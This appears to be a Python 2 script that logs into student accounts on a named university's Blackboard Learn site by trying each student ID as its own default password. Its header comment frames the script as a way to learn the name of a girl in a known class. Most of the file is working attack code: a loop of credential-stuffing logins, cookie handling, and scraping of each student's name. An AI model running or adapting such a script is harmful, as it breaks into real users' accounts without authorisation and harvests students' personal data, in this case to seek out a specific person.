#! /usr/bin/python
# coding:utf-8
# Copyright 2015 wonderqs <https://github.com/wonderqs>
#
# 0x00_find_her_name.py
#
# Another guy told Huang that he saw that girl and is sure which class that girl
# belong to, just do not know her name. So Huang wrote a program to obtain all
# students' name in a same class. How he did it? The answer is the Blackboard
# Learn website of CUST (http://bb.cust.edu.cn) has a configuration
# vulnerability. The username of the website is each students' ID and the
# default password is the same of username, in fact many of students has not
# changed the default password, so in most of case you can log into an account
# with student's ID.
#
# Set the class ID and the number of students in that class and run it! Huang
# get many of names, but he find that he still do not know which name is his
# Juliet ...

import httplib2
from urllib import urlencode
from bs4 import BeautifulSoup

def getName(uid):
    header = {
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17',
        'Accept-Language': 'en-US,en;q=0.8',
        'Content-type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    }
    param = {
        'user_id': uid,
        'password': uid,
        'x': '32',
        'y': '10',
        'action': 'login'
    }
    param = urlencode(param)
    h = httplib2.Http(timeout = 7)
    try:
        resp, content = h.request('http://bb.cust.edu.cn', 'GET', headers = header)
        cookie = resp['set-cookie'].split('; Path=/; HttpOnly')[0].split('; Path=/, ')
        header['Cookie'] = cookie[0] + '; ' + cookie[1]
        resp, content = h.request('http://bb.cust.edu.cn/webapps/login/', 'POST', param, header)
        cookie[1] = resp['set-cookie'].split('; Path=/; HttpOnly, ')[1].split('; Path=/; HttpOnly')[0]
        header['Cookie'] = cookie[0] + '; ' + cookie[1]
        resp, content = h.request('http://bb.cust.edu.cn/webapps/portal/frameset.jsp', 'GET', headers = header)
        cookie.append('')
        cookie[2] = cookie[1]
        cookie[1] = cookie[0]
        cookie[0] = resp['set-cookie'].split('; ')[0]
        header['Cookie'] = cookie[0] + '; ' + cookie[1] + '; ' + cookie[2]
        resp, content = h.request('http://bb.cust.edu.cn/webapps/portal/execute/topframe?tab_tab_group_id=_1_1&frameSize=LARGE', 'GET', headers = header)
    except Exception:
        return 'fail'
    soup = BeautifulSoup(content)
    result = soup.span.string.encode('utf-8').split(' ')
    name = result[1]
    return name

def main():
    # If you want get students' name of the class 1305112xx, set the uid to 130511200
    uid = 150511300

    # The number of students in this class
    count = 30

    # It will display "fail" if the password is changed or the student's ID is not exist
    for i in range(uid + 1, uid + count):
        id = '%d' %i
        print id + '    ' + getName(id)

if __name__ == '__main__':
    main()
